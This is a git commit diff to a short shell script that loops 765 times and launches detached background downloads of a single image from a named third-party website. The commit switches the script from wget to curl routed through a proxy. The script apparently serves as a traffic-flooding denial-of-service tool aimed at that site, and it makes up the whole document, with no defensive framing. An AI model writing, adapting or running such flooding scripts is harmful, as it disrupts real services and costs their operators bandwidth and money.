a4498ec1a535f4597215b4c59fdfefbfff6c5953
xjh2009 <102580788+xjh2009@users.noreply.github.com>
2024-02-26 01:32:45 +0800

    Update kai.sh

--- kai.sh
+++ kai.sh
@@ -1,5 +1,5 @@
 for ((i=1; i<=765; i++))  
 do  
-nohup wget -O sbzp http://idcef.com/themes/clientarea/IDC01/assets/images/sec1.jpg --bind-address=154.7.177.145 > x${i}-start.log 2>&1 &
+nohup curl -o /tmp/sbrz http://idcef.com/themes/clientarea/IDC01/assets/images/sec1.jpg -x 156.224.26.8:443  > /tmp/idc01x${i}-start.log 2>&1 &
 done
 echo ok
